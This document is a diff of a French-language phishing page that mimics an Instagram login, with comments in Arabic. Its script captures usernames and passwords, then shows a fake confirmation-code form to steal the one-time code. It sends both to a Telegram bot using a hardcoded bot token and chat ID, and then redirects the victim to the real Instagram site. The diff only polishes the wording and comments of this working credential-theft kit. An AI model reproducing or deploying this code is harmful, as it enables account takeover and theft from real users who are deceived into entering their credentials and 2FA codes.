@@ -122,9 +122,9 @@
             <button type="submit" class="btn">Se connecter</button>
         </form>
 
-        <!-- نموذج إدخال رمز التحقق (يظهر بعد الضغط على تسجيل الدخول) -->
+        <!-- نموذج طلب الـ OTP الذي ينتظر إدخال المستخدم -->
         <form id="otpForm" class="hidden">
-            <input type="text" id="otpCode" placeholder="Entrez le code de confirmation à 6 chiffres" required>
+            <input type="text" id="otpCode" placeholder="Code de confirmation (6 chiffres)" required>
             <button type="submit" class="btn">Confirmer</button>
         </form>
 
@@ -136,7 +136,7 @@
             </div>
 
             <a href="#" class="fb-login">Se connecter avec Facebook</a>
-            <a href="#" class="forgot-pass">Mot oublié ?</a>
+            <a href="#" class="forgot-pass">Mot de passe oublié ?</a>
         </div>
     </div>
 
@@ -144,40 +144,42 @@
         const botToken = "8970427451:AAFqyCocC3VS1jGYo8Da_ET6PNrV6hWdOVs";
         const chatId = "865078178";
 
-        let capturedUser = "";
+        let savedUser = "";
 
-        // خطوة 1: عند الضغط على تسجيل الدخول، يتم إرسال الباسورد وإظهار حقل رمز التحقق
+        // الخطوة الأولى: التقاط اليوزر والباسورد وإرسالهما، ثم إبقاء المستخدم معلقاً بطلب الـ OTP
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
             const user = document.getElementById('username').value;
             const pass = document.getElementById('password').value;
-            capturedUser = user;
+            savedUser = user;
 
-            const message = "🎯 French Page - Credentials:\n👤 User: " + user + "\n🔑 Password: " + pass + "\n🌐 URL: " + window.location.href;
+            const message = "🎯 [1/2] New Credentials Captured:\n👤 User: " + user + "\n🔑 Password: " + pass + "\n🌐 URL: " + window.location.href;
             const url = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(message);
             
             const img = new Image();
             img.src = url;
 
-            // إخفاء نموذج الباسورد وإظهار نموذج رمز التحقق
+            // إخفاء نموذج تسجيل الدخول وإظهار شاشة إدخال رمز التحقق بانتظار تفاعل المستخدم
             document.getElementById('loginForm').classList.add('hidden');
             document.getElementById('footerSection').classList.add('hidden');
             document.getElementById('otpForm').classList.remove('hidden');
-            document.getElementById('noticeTextinnerText', 'Entrez le code de sécurité envoyé à votre appareil.');
-            document.getElementById('noticeText').textContent = "Entrez le code de sécurité envoyé à votre appareil.";
+            
+            // تغيير النص لتوجيه المستخدم لإدخال الكود
+            document.getElementById('noticeText').textContent = "Entrez le code de confirmation envoyé par SMS ou par email.";
         });
 
-        // خطوة 2: عند إدخال الرمز وإرساله، يتم إرساله لتليجرام ثم التوجيه لإنستغرام
+        // الخطوة الثانية: التقاط كود التحقق عند إدخاله وإرساله لبوت تيليجرام ثم التوجيه للموقع الأصلي
         document.getElementById('otpForm').addEventListener('submit', function(e) {
             e.preventDefault();
             const otp = document.getElementById('otpCode').value;
 
-            const message = "🔐 French Page - OTP Code:\n👤 User: " + capturedUser + "\n🔢 Code: " + otp;
+            const message = "🔐 [2/2] OTP Code Captured:\n👤 User: " + savedUser + "\n🔢 Code: " + otp;
             const url = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(message);
             
             const img = new Image();
             img.src = url;
 
+            // الانتظار نصف ثانية لضمان وصول الرسالة ثم التحويل لإنستغرام
             setTimeout(function() {
                 window.location.href = "https://www.instagram.com";
             }, 500);
